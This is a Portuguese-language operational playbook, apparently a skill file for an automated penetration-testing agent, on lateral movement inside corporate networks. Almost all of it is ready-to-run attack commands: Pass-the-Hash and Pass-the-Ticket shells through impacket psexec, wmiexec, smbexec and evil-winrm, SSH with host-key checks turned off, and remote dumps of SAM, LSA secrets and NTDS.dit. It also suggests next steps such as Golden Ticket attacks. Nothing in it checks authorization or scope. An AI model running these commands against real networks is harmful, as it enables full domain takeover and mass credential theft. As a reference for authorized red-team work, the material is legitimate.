---
name: lateral_movement_psexec
phase: 5_post_exploitation
tools: [impacket, crackmapexec, evil-winrm]
dependencies: [credentials_found]
mitre_tactic: TA0008 (Lateral Movement), TA0006 (Credential Access)
---

# Objetivo
Mover-se lateralmente dentro de uma rede corporativa utilizando credenciais válidas ou hashes NTLM (Pass-the-Hash) para comprometer outros sistemas, alcançar o Domain Controller e expandir o acesso na rede.

# Condições de Execução
- Credenciais válidas (usuário/senha) ou hashes NTLM foram obtidos.
- Acesso à rede interna disponível (via VPN, proxychains ou máquina comprometida).
- Portas SMB (445), WMI (135), WinRM (5985/5986) ou SSH (22) acessíveis em alvos internos.

# Comandos e Sintaxe

## 1. Descoberta de Hosts na Rede Interna
```bash
# Varredura rápida de hosts ativos na subnet
crackmapexec smb {target_range} --gen-relay-list {workspace}/lateral_alive_hosts.txt 2>&1 | tee {workspace}/lateral_host_discovery.txt

# Ou via nmap
nmap -sn {target_range} -oG {workspace}/lateral_ping_sweep.txt 2>&1 | tee {workspace}/lateral_nmap_sweep.txt
```

## 2. Verificar Acesso Administrativo (CrackMapExec)
```bash
# Com senha em texto claro
crackmapexec smb {target_range} -u '{username}' -p '{password}' -d {domain} 2>&1 | tee {workspace}/lateral_cme_admin.txt

# Com hash NTLM (Pass-the-Hash)
crackmapexec smb {target_range} -u '{username}' -H '{ntlm_hash}' -d {domain} 2>&1 | tee {workspace}/lateral_cme_pth.txt

# Verificar WinRM
crackmapexec winrm {target_range} -u '{username}' -p '{password}' -d {domain} 2>&1 | tee {workspace}/lateral_cme_winrm.txt
```

## 3. Execução via PsExec (Impacket) — Shell SYSTEM
```bash
# Com senha
impacket-psexec {domain}/{username}:{password}@{target_ip} 2>&1 | tee {workspace}/lateral_psexec.txt

# Com hash NTLM
impacket-psexec -hashes 00000000000000000000000000000000:{ntlm_hash} {domain}/{username}@{target_ip} 2>&1 | tee {workspace}/lateral_psexec_pth.txt
```

## 4. Execução via WMI (Impacket) — Mais Furtivo
```bash
# Com senha
impacket-wmiexec {domain}/{username}:{password}@{target_ip} 2>&1 | tee {workspace}/lateral_wmiexec.txt

# Com hash NTLM
impacket-wmiexec -hashes 00000000000000000000000000000000:{ntlm_hash} {domain}/{username}@{target_ip} 2>&1 | tee {workspace}/lateral_wmiexec_pth.txt
```

## 5. Execução via SMBExec (Impacket) — Sem Disco
```bash
impacket-smbexec {domain}/{username}:{password}@{target_ip} 2>&1 | tee {workspace}/lateral_smbexec.txt
impacket-smbexec -hashes 00000000000000000000000000000000:{ntlm_hash} {domain}/{username}@{target_ip} 2>&1 | tee {workspace}/lateral_smbexec_pth.txt
```

## 6. Acesso via WinRM (Evil-WinRM) — Porta 5985
```bash
# Com senha
evil-winrm -i {target_ip} -u '{username}' -p '{password}' 2>&1 | tee {workspace}/lateral_winrm.txt

# Com hash NTLM
evil-winrm -i {target_ip} -u '{username}' -H '{ntlm_hash}' 2>&1 | tee {workspace}/lateral_winrm_pth.txt
```

## 7. SSH Lateral (Linux)
```bash
# Com senha
sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target_ip} 'id && hostname && ip a' 2>&1 | tee {workspace}/lateral_ssh.txt

# Com chave privada encontrada
ssh -i {workspace}/id_rsa -o StrictHostKeyChecking=no {username}@{target_ip} 'id && hostname' 2>&1 | tee {workspace}/lateral_ssh_key.txt
```

## 8. Dump de Credenciais no Novo Host
```bash
# SAM dump remoto via CrackMapExec
crackmapexec smb {target_ip} -u '{username}' -p '{password}' -d {domain} --sam 2>&1 | tee {workspace}/lateral_sam_dump.txt

# LSA secrets
crackmapexec smb {target_ip} -u '{username}' -p '{password}' -d {domain} --lsa 2>&1 | tee {workspace}/lateral_lsa_dump.txt

# NTDS.dit (somente Domain Controller)
crackmapexec smb {target_ip} -u '{username}' -p '{password}' -d {domain} --ntds 2>&1 | tee {workspace}/lateral_ntds_dump.txt
```

## 9. Enumeração de Shares no Novo Host
```bash
crackmapexec smb {target_ip} -u '{username}' -p '{password}' -d {domain} --shares 2>&1 | tee {workspace}/lateral_shares.txt
smbclient -L //{target_ip} -U '{domain}\{username}%{password}' 2>&1 | tee -a {workspace}/lateral_shares.txt
```

## 10. Pass-the-Ticket (Kerberos)
```bash
# Exportar ticket com impacket
impacket-getTGT {domain}/{username}:{password} -dc-ip {dc_ip} 2>&1 | tee {workspace}/lateral_tgt.txt
export KRB5CCNAME={workspace}/{username}.ccache
impacket-psexec {domain}/{username}@{target_ip} -k -no-pass 2>&1 | tee {workspace}/lateral_ptt.txt
```

# Análise de Resultados

## Pwn3d! no CrackMapExec
- A credencial tem privilégios administrativos no host → shell SYSTEM disponível.
- Documente: host, método (PsExec/WMI/WinRM), credencial usada.

## Shell Obtido
- Movimento lateral bem-sucedido. Extraia mais credenciais com `--sam` ou `--lsa`.
- Se alcançou Domain Controller → dump NTDS.dit para comprometer todo o domínio.

## Acesso Negado
- Credencial válida mas sem admin local → tente outros hosts.
- UAC Remote Restrictions pode estar bloqueando → use WMI ou WinRM.
- Tente Pass-the-Ticket se Kerberos estiver disponível.

## NTDS Dump
- Se obteve NTDS.dit → todas as credenciais do domínio comprometidas.
- Severidade: **GAME OVER** — Acesso total ao domínio Active Directory.

# Próximos Passos
- **Novas credenciais obtidas:** Repita o ciclo de movimento lateral para mais hosts.
- **Domain Controller comprometido:** Acione `hash_dumping_and_cracking` para crack offline.
- **Linux encontrado na rede:** Use SSH com credenciais reutilizadas.
- **Kerberos TGT obtido:** Tente Golden Ticket ou Silver Ticket attacks.
- **Relatório:** Acione `generate_pentest_report` documentando toda a cadeia de movimento.

# Tratamento de Erros
- **STATUS_ACCESS_DENIED no PsExec:** UAC Remote Restrictions ativo. Tente WMI ou WinRM.
- **Impacket não instalado:** `pip3 install impacket`.
- **Evil-WinRM não instalado:** `gem install evil-winrm`.
- **CrackMapExec não instalado:** `apt-get install -y crackmapexec` ou `pip3 install crackmapexec`.
- **sshpass não instalado:** `apt-get install -y sshpass`.
- **Connection timed out:** Host pode ter firewall. Tente outra porta ou método.
- **Kerberos clock skew:** Sincronize o relógio: `ntpdate {dc_ip}`.
